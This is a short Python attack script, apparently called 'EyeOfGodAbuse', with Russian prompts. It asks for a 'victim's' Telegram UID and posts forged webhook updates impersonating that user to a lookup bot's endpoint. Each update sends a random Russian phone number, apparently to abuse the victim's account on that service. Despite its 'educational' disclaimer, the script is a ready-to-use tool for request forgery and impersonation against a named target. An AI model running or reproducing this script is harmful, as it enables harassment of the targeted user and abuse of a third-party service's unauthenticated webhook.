import asyncio, random, time, requests, os
# Code by Screaze
# Only for education!
print("[?] EyeOfGodAbuse | Dev: Screaze")
print("[!] Не используйте свой UID, действуйте на свой страх и риск!")
print("[!] Утилита сделана в образовательных целях!")
print("[!] По завершению работы, перезапустите софт вручную!")
print("[?] t.me/my_id_bot Чтобы узнать ваш UID/UID Нужного человека.")
print("")
USER_ID = input("[?] Введите UID жертвы > ")

_invalid_phone_codes = (
    907,
    935,
    940,
    942,
    943,
    944,
    945,
    946,
    947,
    948,
    949,
    957,
    959,
    972,
    973,
    974,
    975,
    976,
    979,
    990,
    998,
)

_valid_phone_codes = [x for x in range(900, 999) if x not in _invalid_phone_codes]


def generate_random_phone_number() -> str:
    phone_code = random.choice(_valid_phone_codes)
    number = random.randint(0, 999_99_99)
    return f"7{phone_code}{number:07}"


async def main():
    messages = [generate_random_phone_number() for _ in range(10)]

    for message in messages:
        webhook = {
            "update_id": 99999999,
            "message": {
                "date": 1231231231,
                "chat": {
                    "last_name": "",
                    "id": USER_ID,
                    "first_name": "",
                    "username": "",
                },
                "message_id": 99999999,
                "from": {
                    "last_name": "",
                    "id": USER_ID,
                    "first_name": "",
                    "username": "",
                },
                "text": message,
            },
        }

        r = requests.post(
            f"https://o-api.com/t/bots/eogopendatabot",
            json=webhook,
            headers={"Cache-Control": "no-cache"},
        )
        print(r.text)

        time.sleep(4)


if __name__ == "__main__":
    asyncio.run(main())
